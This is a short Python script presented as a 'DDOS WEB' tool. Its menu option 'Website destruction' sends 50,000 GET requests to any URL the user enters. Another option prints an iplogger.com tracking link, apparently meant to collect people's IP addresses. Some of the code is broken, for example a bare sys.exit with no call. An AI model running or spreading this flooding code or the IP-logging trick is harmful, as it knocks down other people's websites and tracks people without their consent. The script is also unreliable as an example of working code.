import sysinfo
import os
import sys
import time
from colorama import*
import requests
import platform
import socket
import pyfiglet
#::::::
result = pyfiglet.figlet_format("ddos web", font="slant")

print(result)
print(Fore.YELLOW+"""
    ___________________________
            Tool Name : DDOS WEB          
            Tool URL : www.ddosweb.com  
            Developer Name : arshia            
    ___________________________
  
  """)
#............
time.sleep(0.2)
print(Fore.YELLOW+"[1]"+Fore.GREEN+"""Website destruction
""")

print(Fore.YELLOW+"[2]"+Fore.GREEN+"""Get an IP website
""")

print(Fore.YELLOW+"[3]"+Fore.GREEN+"""Operating System Information
""")
print(Fore.YELLOW+"[4]"+Fore.GREEN+"""adres ip system 
""")
time.sleep(0.2)
strish = input(Fore.RED + "━━━"+          Style.DIM +Fore.YELLOW+"‌[@HOME/]" + "~ ")

if(strish == "1"):
    ari = input(Fore.YELLOW + "Website URL : ")
    for i in range(0, 50000):
        print(requests.get(ari))
        
elif(strish == "3"):
    print(platform.uname())

    time.sleep(0.2)
elif(strish == "2"):
    print(Fore.RED + "This section is developing, please be patient :)")
    time.sleep(4)
    sys.exit
    
elif(strish == "4"):
    print(Fore.WHITE+"http://iplogger.com/1B8Jx7.gif")